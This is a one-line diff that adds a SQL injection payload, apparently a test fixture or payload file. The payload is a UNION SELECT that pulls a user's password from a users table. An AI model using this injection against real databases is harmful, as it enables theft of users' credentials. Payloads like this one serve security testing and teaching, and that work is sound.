@@ -1,0 +1,1 @@
+1 union select 0, password from users where id = 1 --
